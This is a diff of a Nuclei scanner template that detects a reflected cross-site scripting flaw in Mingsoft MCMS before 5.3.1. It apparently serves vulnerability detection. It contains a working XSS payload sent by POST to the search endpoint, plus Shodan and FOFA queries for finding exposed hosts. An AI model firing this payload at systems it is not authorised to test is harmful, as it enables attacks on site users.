@@ -1,5 +1,4 @@
 id: mcms-search-xss
-
 info:
   name: Mingsoft MCMS < 5.3.1 - Cross-Site Scripting
   author: ritikchaddha
@@ -15,53 +14,45 @@ info:
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
     cvss-score: 6.1
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-83
+    cpe: cpe:2.3:a:mingsoft:mcms:*:*:*:*:*:*:*:*
     epss-score: 0.00345
     epss-percentile: 0.6789
-    cpe: cpe:2.3:a:mingsoft:mcms:*:*:*:*:*:*:*:*
   metadata:
+    fofa-query: icon_hash="1464851260"
     max-request: 2
-    vendor: mingsoft
     product: mcms
     shodan-query: http.favicon.hash:1464851260
-    fofa-query: icon_hash="1464851260"
-  tags: mingsoft,mcms,xss
-
+    vendor: mingsoft
+  tags: mcms,mingsoft,vuln,xss
 flow: http(1) && http(2)
-
 http:
-  - raw:
+  - matchers:
+      - internal: true
+        type: word
+        words:
+          - mingsoft.net
+    raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: word
+  - matchers:
+      - part: body
+        type: word
         words:
-          - "mingsoft.net"
-        internal: true
-
-  - raw:
+          - '><sVg/Onload=alert`document.domain`>'
+      - part: content_type
+        type: word
+        words:
+          - text/html
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /mcms/search.do HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         content_title=1"><sVg/Onload=alert`document.domain`></p>
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "><sVg/Onload=alert`document.domain`>"
-
-      - type: word
-        part: content_type
-        words:
-          - text/html
-
-      - type: status
-        status:
-          - 200
-# digest: 490a004630440220243d7fee42311b9915a8bd3fba36c0e4b5d32b74f5c109dfb3a05a763638f64302205f42add18eb82ea7f1b7681b2b6144d55663838620f9313c3056f222dfd13077:922c64590222798bb761d5b6d8e72950
